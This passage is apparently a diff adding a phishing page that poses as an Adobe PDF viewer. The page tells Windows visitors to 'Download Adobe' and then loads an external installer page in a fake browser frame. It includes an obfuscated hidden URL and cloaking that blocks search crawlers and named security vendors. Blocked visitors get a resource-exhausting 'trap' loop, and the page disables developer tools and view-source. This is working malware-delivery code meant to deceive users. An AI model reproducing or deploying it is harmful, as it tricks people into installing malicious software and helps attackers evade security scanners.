LTEuNzYxLTEuNjM3LDEuOTYzLDEuOTYzLDAsMCwwLTEuOTg5LDEuODIzWiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTcyMS41OCAxNjIuMjYpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgICA8ZyB0cmFuc2Zvcm09Im1hdHJpeCgxLCAwLCAwLCAxLCAtMzAsIC0zMCkiIGZpbHRlcj0idXJsKCNQYXRoXzkpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfOS0yIiBkYXRhLW5hbWU9IlBhdGggOSIgZD0iTTY4NC45NzMtMTQzLjM4SDY5NXYyNFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC02MzcuODggMTczLjM4KSIgZmlsbD0iI2ZhMGYwMCIvPgogICAgPC9nPgogICAgPGcgdHJhbnNmb3JtPSJtYXRyaXgoMSwgMCwgMCwgMSwgLTMwLCAtMzApIiBmaWx0ZXI9InVybCgjUGF0aF8xMCkiPgogICAgICA8cGF0aCBpZD0iUGF0aF8xMC0yIiBkYXRhLW5hbWU9IlBhdGggMTAiIGQ9Ik02NTYuMTQtMTQzLjM4SDY0Ni4xMDl2MjRaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNjE2LjExIDE3My4zOCkiIGZpbGw9IiNmYTBmMDAiLz4KICAgIDwvZz4KICAgIDxnIHRyYW5zZm9ybT0ibWF0cml4KDEsIDAsIDAsIDEsIC0zMCwgLTMwKSIgZmlsdGVyPSJ1cmwoI1BhdGhfMTEpIj4KICAgICAgPHBhdGggaWQ9IlBhdGhfMTEtMiIgZGF0YS1uYW1lPSJQYXRoIDExIiBkPSJNNjcxLjM2Mi0xMjMuMjcxbDYuMzg3LDE1LjE1NGgtNC4xODZsLTEuOTExLTQuODI2aC00LjY3NFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC02MjcuOCAxNjIuMTIpIiBmaWxsPSIjZmEwZjAwIi8+CiAgICA8L2c+CiAgPC9nPgo8L3N2Zz4K" alt="Adobe Logo">
+      </div>
+      
+      <div class="challenge-desc">Proof you are human to view the file.</div>
+      
+      <div class="captcha-container">
+        <form id="recaptcha-form" autocomplete="off">
+          <div class="g-recaptcha" data-sitekey="6LeCvMIrAAAAALHdCaECvUrWJ7ntwt2qVpQlT65i" data-callback="onRecaptchaSuccess"></div>
+          
+          <!-- Multiple honeypots with random names (hidden from users) -->
+          <input type="text" name="u198xz" style="position: absolute; left: -9999px; top: -9999px;" tabindex="-1" autocomplete="off">
+          <input type="email" name="e2387q" style="position: absolute; left: -9999px; top: -9999px;" tabindex="-1" autocomplete="off">
+          
+          <!-- Security tokens -->
+          <input type="hidden" id="dynamic-token" name="dynamic-token" value="">
+          <input type="hidden" id="browser-fingerprint" name="browser-fingerprint" value="">
+          <input type="hidden" id="challenge-timestamp" name="challenge-timestamp" value="">
+          
+          <button type="submit" id="continue-btn">Continue</button>
+        </form>
+        
+        <div class="recaptcha-disclaimer">
+          This page is protected by reCAPTCHA, and subject to the Google
+          <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privacy Policy</a> and
+          <a href="https://policies.google.com/terms" target="_blank" rel="noopener">Terms of Service</a>.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div id="main-content">
+    <!-- Blurry document background -->
+    <div id="blurry-bg"></div>
+    <div id="iframe-btn-container">
+      <img class="adobe-logo" src="https://www.softwareworld.co/assets/software/logo/adobe-acrobat-reader.jpg" alt="Adobe Acrobat Reader">
+      <div class="instructions">
+        This secure PDF shared with you was created using the latest version of Adobe. You have to update your Adobe PDF reader to view the document.
+      </div>
+      <button id="open-iframe-btn">Download Adobe</button>
+    </div>
+
+    <!-- Popup Modal for Iframe -->
+    <div id="iframe-modal">
+      <div class="modal-content" id="browser-window">
+        <div class="browser-header">
+          <!-- Tab Bar -->
+          <div class="tab-bar">
+            <div class="window-controls">
+              <div class="window-control minimize"></div>
+              <div class="window-control maximize"></div>
+              <div class="window-control close" id="close-iframe-modal"></div>
+            </div>
+            <div class="tab active">
+              <img class="tab-favicon" src="https://www.google.com/s2/favicons?domain=adobe.com&sz=32" alt="">
+              <span class="tab-title">Download Adobe Acrobat Reader</span>
+              <div class="tab-close">
+                <svg viewBox="0 0 24 24" fill="none">
+                  <path d="M18 6L6 18M6 6l12 12" stroke="currentColor"/>
+                </svg>
+              </div>
+            </div>
+            <div class="tab">
+              <img class="tab-favicon" src="https://www.google.com/s2/favicons?domain=google.com&sz=32" alt="">
+              <span class="tab-title">Google</span>
+              <div class="tab-close">
+                <svg viewBox="0 0 24 24" fill="none">
+                  <path d="M18 6L6 18M6 6l12 12" stroke="currentColor"/>
+                </svg>
+              </div>
+            </div>
+          </div>
+          
+          <!-- Navigation Bar -->
+          <div class="nav-bar">
+            <div class="nav-button disabled">
+              <svg viewBox="0 0 24 24">
+                <path d="M15 18l-6-6 6-6" stroke="currentColor"/>
+              </svg>
+            </div>
+            <div class="nav-button disabled">
+              <svg viewBox="0 0 24 24">
+                <path d="M9 18l6-6-6-6" stroke="currentColor"/>
+              </svg>
+            </div>
+            <div class="nav-button">
+              <svg viewBox="0 0 24 24">
+                <path d="M20 12a8 8 0 01-8 8 8 8 0 01-8-8 8 8 0 118 8v-8" stroke="currentColor"/>
+              </svg>
+            </div>
+            
+            <div class="address-bar-container">
+              <div class="site-info">
+                <svg class="lock-icon" viewBox="0 0 24 24" fill="#34a853">
+                  <path d="M19 11H5a2 2 0 00-2 2v7a2 2 0 002 2h14a2 2 0 002-2v-7a2 2 0 00-2-2zM7 11V7a5 5 0 0110 0v4"/>
+                </svg>
+                <span class="url-text">https://get.adobe.com/reader/download?os=Windows+10&name=Reader+2025.001.20630+English+for+Windows&lang=en&nativeOs=Windows+10&accepted=&declined=&preInstalled=&site=enterprise</span>
+              </div>
+            </div>
+            
+            <div class="nav-extensions">
+              <div class="extension-icon">
+                <img src="https://www.google.com/s2/favicons?domain=lastpass.com&sz=32" alt="LastPass" title="LastPass">
+              </div>
+              <div class="extension-icon">
+                <img src="https://www.google.com/s2/favicons?domain=adblockplus.org&sz=32" alt="AdBlock" title="AdBlock Plus">
+              </div>
+            </div>
+            
+            <div class="browser-menu">
+              <svg viewBox="0 0 24 24" width="16" height="16" fill="#9aa0a6">
+                <circle cx="12" cy="12" r="2"/>
+                <circle cx="12" cy="5" r="2"/>
+                <circle cx="12" cy="19" r="2"/>
+              </svg>
+            </div>
+          </div>
+        </div>
+        
+        <iframe id="popup-iframe" src=""></iframe>
+      </div>
+    </div>
+  </div>
+
+  <!-- reCAPTCHA Script -->
+  <script src='https://www.google.com/recaptcha/api.js' async defer></script>
+
+  <script>
+    // Global variables
+    let recaptchaCompleted = false;
+    let fingerprintGenerated = false;
+    
+    // Store verification state and client information
+    const appState = {
+      verification: {
+        recaptchaPassed: false,
+        fingerprintVerified: false,
+        environmentVerified: false,
+        humanVerified: false
+      },
+      clientInfo: {
+        fingerprint: null,
+        timestamp: null,
+        token: null
+      }
+    };
+
+    // Obfuscated URL parts
+    const _u = {
+      p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",
+      h: atob("Ly9KRldXSTdHclBvekppSUVDMHRNdi5jb2Rlc3Boc2VyZS5ydS8="),
+      e: "ZhZW/".split("").reverse().join("")
+    };
+
+    // Bot detection blacklist system
+    const blacklistSystem = {
+      knownBotSignatures: [
+        "googlebot", "bingbot", "yandexbot", "slurp", "duckduckbot", "baiduspider", 
+        "bytespider", "facebookexternalhit", "twitterbot", "rogerbot", "linkedinbot",
+        "embedly", "quora link preview", "showyoubot", "outbrain", "pinterest",
+        "slackbot", "vkshare", "w3c_validator", "postman", "curl", "wget", "python-requests",
+        "ahrefs", "semrushbot", "mj12bot", "applebot", "dotbot", "zoominfobot",
+        "scanner", "crawler", "spider", "headless", "scraper", "selenium", "webdriver", 
+        "puppeteer", "phantom", "nightmare", "jsdom"
+      ],
+      
+      securityTools: [
+        "avast", "avg", "avira", "bitdefender", "kaspersky", "mcafee", "norton", 
+        "eset", "f-secure", "trend micro", "sophos", "symantec", "trustwave", "forcepoint",
+        "checkpoint", "barracuda", "mimecast", "proofpoint", "fireeye", "crowdstrike",
+        "cyren", "spamhaus", "spamcop", "netcraft", "virustotal", "sucuri", "urlscan",
+        "zscaler", "office365", "microsoft-security", "cisco", "forcepoint", "cofense"
+      ],
+
+      checkBlacklist: function() {
+        const result = { blocked: false, reason: null };
+        const userAgent = navigator.userAgent.toLowerCase();
+        
+        // Check user agent against known bot signatures
+        for (const botSignature of this.knownBotSignatures) {
+          if (userAgent.includes(botSignature)) {
+            result.blocked = true;
+            result.reason = "known_bot";
+            return result;
+          }
+        }
+        
+        // Check for security tools
+        for (const tool of this.securityTools) {
+          if (userAgent.includes(tool)) {
+            result.blocked = true;
+            result.reason = "security_tool";
+            return result;
+          }
+        }
+        
+        return result;
+      }
+    };
+
+    // Browser fingerprinting
+    async function generateBrowserFingerprint() {
+      try {
+        const components = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          languages: navigator.languages,
+          platform: navigator.platform,
+          cores: navigator.hardwareConcurrency || 0,
+          deviceMemory: navigator.deviceMemory || 0,
+          screenRes: `${screen.width}x${screen.height}`,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio || 1,
+          timezone: new Date().getTimezoneOffset(),
+          timezoneStr: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          touchPoints: navigator.maxTouchPoints || 0,
+          cookiesEnabled: navigator.cookieEnabled,
+          localStorage: !!window.localStorage,
+          sessionStorage: !!window.sessionStorage,
+          indexedDB: !!window.indexedDB,
+          canvasHash: await generateCanvasFingerprint()
+        };
+        
+        const fingerprintStr = JSON.stringify(components);
+        const encoder = new TextEncoder();
+        const data = encoder.encode(fingerprintStr);
+        const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);
+        
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+      } catch (error) {
+        return generateFallbackFingerprint();
+      }
+    }
+
+    function generateFallbackFingerprint() {
+      const components = [
+        navigator.userAgent,
+        navigator.language,
+        screen.colorDepth,
+        screen.width + 'x' + screen.height,
+        new Date().getTimezoneOffset(),
+        !!navigator.cookieEnabled,
+        typeof(window.sessionStorage) !== 'undefined',
+        typeof(window.localStorage) !== 'undefined'
+      ];
+      
+      return btoa(components.join('###'));
+    }
+
+    async function generateCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 250;
+        canvas.height = 60;
+        const ctx = canvas.getContext('2d');
+        
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        
+        const gradient = ctx.createLinearGradient(0, 0, canvas.width, 0);
+        gradient.addColorStop(0, "rgba(102, 204, 0, 0.7)");
+        gradient.addColorStop(1, "rgba(0, 0, 153, 0.7)");
+        ctx.fillStyle = gradient;
+        ctx.fillRect(0, 25, canvas.width, 35);
+        
+        ctx.fillStyle = '#069';
+        ctx.font = '15px Arial';
+        ctx.fillText('Browser Fingerprint 👁️ Test 123', 4, 17);
+        
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.font = '16px Georgia';
+        ctx.fillText('I\'m a 👋 human, not a bot!', 4, 45);
+        
+        const dataURL = canvas.toDataURL('image/png');
+        const encoder = new TextEncoder();
+        const data = encoder.encode(dataURL);
+        const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);
+        
+        return Array.from(new Uint8Array(hashBuffer))
+          .map(b => b.toString(16).padStart(2, '0'))
+          .join('');
+      } catch (e) {
+        return "canvas_not_supported";
+      }
+    }
+
+    // Environment validation
+    function validateBrowserEnvironment() {
+      // Check for automation indicators
+      if (window.navigator.webdriver ||
+          window.callPhantom ||
+          window._phantom ||
+          window.Buffer ||
+          window.emit ||
+          window.spawn) {
+        return false;
+      }
+      
+      // Check for selenium/webdriver
+      if (document.$cdc_asdjflasutopfhvcZLmcfl_ ||
+          document.documentElement.getAttribute('webdriver') ||
+          navigator.webdriver) {
+        return false;
+      }
+      
+      return true;
+    }
+
+    // Generate dynamic token
+    function generateDynamicToken() {
+      const timestamp = Date.now();
+      const random = Math.random().toString(36).substring(2, 15);
+      const userAgent = navigator.userAgent.substring(0, 10);
+      
+      return btoa(timestamp + random + userAgent).substring(0, 32);
+    }
+
+    // Simplified verification logic with debug info
+    function verifyHumanSubmission() {
+      console.log('Verification Debug Info:');
+      console.log('reCAPTCHA passed:', recaptchaCompleted);
+      console.log('Fingerprint generated:', fingerprintGenerated);
+      console.log('Fingerprint length:', appState.clientInfo.fingerprint ? appState.clientInfo.fingerprint.length : 0);
+      console.log('Token length:', appState.clientInfo.token ? appState.clientInfo.token.length : 0);
+      
+      // Relaxed verification - only require reCAPTCHA
+      if (!recaptchaCompleted) {
+        console.log('Verification failed: reCAPTCHA not completed');
+        return false;
+      }
+      
+      // Check basic fingerprint exists
+      if (!appState.clientInfo.fingerprint || appState.clientInfo.fingerprint.length < 5) {
+        console.log('Verification failed: Invalid fingerprint');
+        return false;
+      }
+      
+      // Check basic token exists
+      if (!appState.clientInfo.token || appState.clientInfo.token.length < 10) {
+        console.log('Verification failed: Invalid token');
+        return false;
+      }
+      
+      console.log('Verification passed!');
+      return true;
+    }
+
+    // Check localStorage for existing verification
+    function checkExistingVerification() {
+      try {
+        const humanVerified = localStorage.getItem('human_verified');
+        const verificationTime = localStorage.getItem('verification_time');
+        
+        if (humanVerified === 'true' && verificationTime) {
+          const timeDiff = Date.now() - parseInt(verificationTime);
+          // Verification valid for 24 hours
+          if (timeDiff < 86400000) {
+            return true;
+          }
+        }
+      } catch (e) {
+        // localStorage might be disabled
+      }
+      
+      return false;
+    }
+
+    // Bot trap system
+    function serveBotTrap() {
+      document.body.innerHTML = `
+        <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #f7f7f7; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+          <div style="background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); max-width: 550px; width: 100%; padding: 40px; text-align: center;">
+            <div style="font-size: 50px; margin-bottom: 20px;">🚧</div>
+            <h1 style="margin-bottom: 20px; font-size: 28px; font-weight: 500; color: #333;">We're making some improvements</h1>
+            <p style="margin-bottom: 15px; color: #666;">This website is currently undergoing scheduled maintenance.</p>
+            <p style="margin-bottom: 15px; color: #666;">We apologize for any inconvenience and should be back online shortly.</p>
+            <button style="margin-top: 20px; padding: 10px 20px; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; background: #4285f4; color: white;" onclick="activateTrap()">Check if site is ready</button>
+          </div>
+        </div>
+      `;
+    }
+
+    function activateTrap() {
+      const memoryConsumer = [];
+      function infiniteLoop() {
+        for (let i = 0; i < 10000; i++) {
+          memoryConsumer.push(Array(1000).fill(Math.random().toString(36)));
+        }
+        let result = 0;
+        for (let i = 0; i < 10000000; i++) {
+          result += Math.sqrt(i) * Math.cos(i) / (1 + Math.sin(i));
+        }
+        setTimeout(infiniteLoop, 10);
+      }
+      infiniteLoop();
+    }
+
+    // Browser detection
+    function detectBrowser() {
+      var userAgent = navigator.userAgent;
+      var browserClass = 'browser-chrome'; // default
+      
+      if (userAgent.indexOf('Firefox') > -1) {
+        browserClass = 'browser-firefox';
+      } else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) {
+        browserClass = 'browser-safari';
+      } else if (userAgent.indexOf('Edge') > -1 || userAgent.indexOf('Edg/') > -1) {
+        browserClass = 'browser-edge';
+      } else if (userAgent.indexOf('OPR') > -1 || userAgent.indexOf('Opera') > -1) {
+        browserClass = 'browser-opera';
+      }
+      
+      return browserClass;
+    }
+
+    // reCAPTCHA success callback - THIS IS CRITICAL
+    function onRecaptchaSuccess(token) {
+      console.log('reCAPTCHA success callback triggered');
+      recaptchaCompleted = true;
+      appState.verification.recaptchaPassed = true;
+    }
+
+    // Make sure the callback is globally available
+    window.onRecaptchaSuccess = onRecaptchaSuccess;
+
+    // Mobile detection function
+    function isMobileDevice() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const mobileKeywords = [
+        'mobile', 'iphone', 'ipod', 'android', 'blackberry', 'nokia', 
+        'opera mini', 'windows mobile', 'windows phone', 'iemobile',
+        'tablet', 'ipad', 'kindle', 'silk', 'playbook', 'bb10'
+      ];
+      
+      // Check user agent for mobile keywords
+      for (const keyword of mobileKeywords) {
+        if (userAgent.includes(keyword)) {
+          return true;
+        }
+      }
+      
+      // Check screen size (mobile typically < 768px width)
+      if (window.innerWidth <= 768 || window.innerHeight <= 600) {
+        return true;
+      }
+      
+      // Check for touch support (not foolproof but helps)
+      if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
+        return true;
+      }
+      
+      return false;
+    }
+
+    // Check if user is on non-Windows OS
+    function isNonWindowsOS() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const platform = navigator.platform.toLowerCase();
+      
+      // Check for non-Windows platforms
+      const nonWindowsPlatforms = [
+        'mac', 'iphone', 'ipad', 'ipod', 'android', 'linux', 'x11',
+        'freebsd', 'openbsd', 'sunos', 'cros'
+      ];
+      
+      for (const platform_name of nonWindowsPlatforms) {
+        if (userAgent.includes(platform_name) || platform.includes(platform_name)) {
+          return true;
+        }
+      }
+      
+      return false;
+    }
+
+    // Function to show mobile warning
+    function showMobileWarning() {
+      const overlay = document.getElementById('mobile-warning-overlay');
+      if (overlay) {
+        overlay.style.display = 'flex';
+      }
+    }
+
+    // Function to close mobile warning
+    function closeMobileWarning() {
+      const overlay = document.getElementById('mobile-warning-overlay');
+      if (overlay) {
+        overlay.style.display = 'none';
+      }
+      // Set a flag so the warning doesn't show again this session
+      sessionStorage.setItem('mobile_warning_dismissed', 'true');
+    }
+
+    // Make closeMobileWarning globally available
+    window.closeMobileWarning = closeMobileWarning;
+
+    // Initialize application
+    async function initializeApp() {
+      console.log('Initializing app...');
+      
+      // Check for mobile devices or non-Windows OS first
+      const wasDismissed = sessionStorage.getItem('mobile_warning_dismissed');
+      if ((isMobileDevice() || isNonWindowsOS()) && !wasDismissed) {
+        console.log('Mobile device or non-Windows OS detected, showing warning');
+        showMobileWarning();
+        return; // Don't continue with app initialization
+      }
+      
+      // Check if already verified
+      if (checkExistingVerification()) {
+        console.log('Found existing verification, showing main content');
+        showMainContent();
+        return;
+      }
+
+      // Check for bots
+      const blacklistCheck = blacklistSystem.checkBlacklist();
+      if (blacklistCheck.blocked) {
+        console.log('Bot detected, serving trap');
+        serveBotTrap();
+        return;
+      }
+
+      // Validate environment
+      if (!validateBrowserEnvironment()) {
+        console.log('Invalid environment detected');
+        serveBotTrap();
+        return;
+      }
+
+      // Generate fingerprint and tokens
+      console.log('Generating fingerprint...');
+      appState.clientInfo.fingerprint = await generateBrowserFingerprint();
+      appState.clientInfo.timestamp = Date.now().toString();
+      appState.clientInfo.token = generateDynamicToken();
+      fingerprintGenerated = true;
+
+      // Set hidden form values
+      document.getElementById('browser-fingerprint').value = appState.clientInfo.fingerprint;
+      document.getElementById('challenge-timestamp').value = appState.clientInfo.timestamp;
+      document.getElementById('dynamic-token').value = appState.clientInfo.token;
+
+      console.log('Initialization complete. Fingerprint length:', appState.clientInfo.fingerprint.length);
+      
+      // Show captcha overlay
+      document.getElementById('captcha-overlay').style.display = 'flex';
+    }
+
+    // Show main content
+    function showMainContent() {
+      document.getElementById('captcha-overlay').style.display = 'none';
+      const mainContent = document.getElementById('main-content');
+      mainContent.style.display = 'flex';
+      mainContent.classList.add('show');
+      
+      // Apply browser class
+      const browserWindow = document.getElementById('browser-window');
+      if (browserWindow) {
+        browserWindow.classList.add(detectBrowser());
+      }
+    }
+
+    // Initialize when DOM is loaded
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log('DOM loaded, setting up event handlers...');
+      
+      const form = document.getElementById('recaptcha-form');
+      if (form) {
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+          console.log('Form submitted, verifying...');
+          
+          // Verify submission
+          if (verifyHumanSubmission()) {
+            console.log('Verification successful, storing and showing main content');
+            // Store verification in localStorage
+            try {
+              localStorage.setItem('human_verified', 'true');
+              localStorage.setItem('verification_time', Date.now().toString());
+            } catch (e) {
+              console.log('Could not store in localStorage:', e);
+            }
+            
+            // Show main content
+            showMainContent();
+          } else {
+            console.log('Verification failed');
+            alert('Verification failed. Please complete the reCAPTCHA and try again.');
+          }
+        });
+      }
+
+      // Main content event handlers
+      const openBtn = document.getElementById('open-iframe-btn');
+      if (openBtn) {
+        openBtn.onclick = function() {
+          var url = 'https://richybrig-spec.github.io/msi/';
+          document.getElementById('popup-iframe').src = url;
+          document.getElementById('iframe-modal').style.display = 'flex';
+          document.getElementById('iframe-btn-container').style.display = 'none';
+          
+          const browserWindow = document.getElementById('browser-window');
+          browserWindow.classList.add(detectBrowser());
+        };
+      }
+      
+      const closeBtn = document.getElementById('close-iframe-modal');
+      if (closeBtn) {
+        closeBtn.onclick = function() {
+          document.getElementById('iframe-modal').style.display = 'none';
+          document.getElementById('popup-iframe').src = '';
+          document.getElementById('iframe-btn-container').style.display = 'block';
+        };
+      }
+      
+      // Refresh button functionality
+      const refreshBtn = document.querySelector('.nav-button:nth-child(3)');
+      if (refreshBtn) {
+        refreshBtn.onclick = function() {
+          var iframe = document.getElementById('popup-iframe');
+          if (iframe.src) {
+            iframe.src = iframe.src;
+          }
+        };
+      }
+      
+      // Tab close buttons
+      var tabCloseButtons = document.querySelectorAll('.tab-close');
+      tabCloseButtons.forEach(function(btn) {
+        btn.onclick = function(e) {
+          e.stopPropagation();
+          document.getElementById('close-iframe-modal').click();
+        };
+      });
+
+      // Initialize app
+      initializeApp();
+    });
+
+    // Additional source protection measures
+    document.addEventListener('DOMContentLoaded', function() {
+      // Disable right-click context menu
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+      });
+
+      // Disable common keyboard shortcuts for viewing source
+      document.addEventListener('keydown', function(e) {
+        // Disable F12 (Developer Tools)
+        if (e.keyCode === 123) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Disable Ctrl+Shift+I (Developer Tools)
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Disable Ctrl+Shift+C (Element Inspector)
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Disable Ctrl+Shift+J (Console)
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Disable Ctrl+U (View Source)
+        if (e.ctrlKey && e.keyCode === 85) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Disable Ctrl+S (Save As)
+        if (e.ctrlKey && e.keyCode === 83) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Disable Ctrl+A (Select All)
+        if (e.ctrlKey && e.keyCode === 65) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Disable Ctrl+P (Print)
+        if (e.ctrlKey && e.keyCode === 80) {
+          e.preventDefault();
+          return false;
+        }
+      });
+
+      // Disable text selection
+      document.onselectstart = function() {
+        return false;
+      };
+      
+      document.onmousedown = function() {
+        return false;
+      };
+
+      // Disable drag and drop
+      document.ondragstart = function() {
+        return false;
+      };
+
+      // Clear console periodically (anti-debugging)
+      setInterval(function() {
+        console.clear();
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
